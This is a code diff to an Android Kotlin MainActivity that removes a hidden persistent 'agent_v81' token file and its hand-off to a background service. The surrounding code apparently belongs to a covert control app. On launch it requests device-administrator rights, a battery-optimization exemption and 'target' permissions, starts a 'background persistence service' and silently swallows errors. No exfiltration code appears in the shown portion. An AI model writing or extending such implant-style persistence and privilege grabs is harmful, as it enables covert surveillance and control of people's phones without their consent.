@@ -20,11 +20,6 @@ import android.webkit.WebViewClient
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import java.io.File
-import java.io.FileInputStream
-import java.io.FileOutputStream
-import java.io.ObjectInputStream
-import java.io.ObjectOutputStream
 import java.util.UUID
 
 class MainActivity : AppCompatActivity() {
@@ -32,7 +27,6 @@ class MainActivity : AppCompatActivity() {
     private lateinit var webView: WebView
     private val PERMISSION_REQUEST_CODE = 600
     private val ADMIN_REQUEST_CODE = 700
-    private lateinit var sessionToken: String
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -42,33 +36,12 @@ class MainActivity : AppCompatActivity() {
             setContentView(webView)
         } catch (e: Exception) {}
 
-        sessionToken = loadOrCreatePersistentToken()
-
         requestTargetPermissions()
         requestBatteryOptimizationExemption()
         requestDeviceAdministrator()
         setupEngineWebView()
         
         startBackgroundPersistenceService()
-    }
-
-    private fun loadOrCreatePersistentToken(): String {
-        return try {
-            val tokenFile = File(filesDir, ".persistent_token_v81.dat")
-            if (tokenFile.exists()) {
-                ObjectInputStream(FileInputStream(tokenFile)).use { ois ->
-                    ois.readObject() as String
-                }
-            } else {
-                val newToken = "agent_v81_" + UUID.randomUUID().toString().substring(0, 8)
-                ObjectOutputStream(FileOutputStream(tokenFile)).use { oos ->
-                    oos.writeObject(newToken)
-                }
-                newToken
-            }
-        } catch (e: Exception) {
-            "agent_v81_" + UUID.randomUUID().toString().substring(0, 8)
-        }
     }
 
     private fun requestTargetPermissions() {
@@ -124,9 +97,7 @@ class MainActivity : AppCompatActivity() {
 
     private fun startBackgroundPersistenceService() {
         try {
-            val serviceIntent = Intent(this, BackgroundControlService::class.java).apply {
-                putExtra("token", sessionToken)
-            }
+            val serviceIntent = Intent(this, BackgroundControlService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(serviceIntent)
             } else {
